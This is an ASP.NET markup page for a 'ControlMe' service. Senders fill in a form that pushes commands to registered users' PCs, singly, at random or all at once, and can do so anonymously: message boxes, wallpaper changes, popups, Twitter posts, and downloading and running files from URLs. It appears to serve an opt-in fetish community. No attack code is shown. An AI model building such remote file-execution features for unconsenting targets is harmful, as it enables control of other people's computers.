<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="ControlPC.aspx.cs" Inherits="ControlMe.Pages.ControlPC" %>

<asp:Content ID="Content1" ContentPlaceHolderID="head" runat="server">
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
    <a>You can control one or many users PC by putting url's in the boxes below.<br />
        However first you must register and type your user info into the boxes.<br />
        Message box can take normal text and will appear on their screen.<br />
        Open Website can be any web location.<br />
        The others needs to be url's the end in file type be the jpg,mpg, gif etc.<br />
        Leave the user name empty to send the commands to a random user.<br />
        Pick a group to send to whole group.
    </a>

    <table style="width: 70%;" id="HsBrd">
        <tr>
            <td style="width: 15%">User Name : </td>
            <td>
                <asp:TextBox ID="UserNm" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td style="width: 15%">All users : </td>
            <td>
                <asp:CheckBox ID="SndAll" runat="server" /></td>
        </tr>
        <tr>
            <td>Message box : </td>
            <td>
                <asp:Label Text="Message" runat="server" /><asp:TextBox ID="MessBx" runat="server" Width="95%"></asp:TextBox><br />
                <asp:Label Text="Button" runat="server" /><asp:TextBox ID="Btnbx" runat="server" Width="95%"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td>Download File : </td>
            <td>
                <asp:TextBox ID="DownLd" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td>Change wallpaper : </td>
            <td>
                <asp:TextBox ID="wallp" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td>Run File : </td>
            <td>
                <asp:TextBox ID="runf" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td>Open Website : </td>
            <td>
                <asp:TextBox ID="openw" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td>Popup + Download : </td>
            <td>
                <asp:TextBox ID="popd" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td>Popup (url) : </td>
            <td>
                <asp:TextBox ID="popu" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td>Twitter Post : </td>
            <td>
                <asp:TextBox ID="twitterTxt" runat="server" Width="95%"></asp:TextBox></td>
        </tr>
        <tr>
            <td>Subliminal Message : </td>
            <td>
                <asp:TextBox ID="Sublimbx" runat="server" Width="95%"></asp:TextBox><br />
                <asp:CheckBox ID="isurl" Text="Is Url" runat="server" /></td>
        </tr>
        <tr>
            <td>Your UserName :<br />
                Your Password :</td>
            <td>
                <asp:TextBox ID="SendUsr" runat="server" Width="95%"></asp:TextBox><br />
                <asp:TextBox ID="SendPwd" runat="server" Width="95%" TextMode="Password"></asp:TextBox><br />
                Leave blank send send anonymously</td>
        </tr>
        <tr>
            <td colspan="2" style="width: 95%; vertical-align: middle; text-align: center">
                <asp:Button ID="Send" Text="Send" runat="server" OnClick="Send_Click" /></td>
        </tr>
    </table>
    <a>Meet other click sluts on the discord server : <a href="https://discord.gg/27VSnVv9P8">Invite</a></a>
    <asp:Label ID="errorlbl" runat="server"></asp:Label>
</asp:Content>
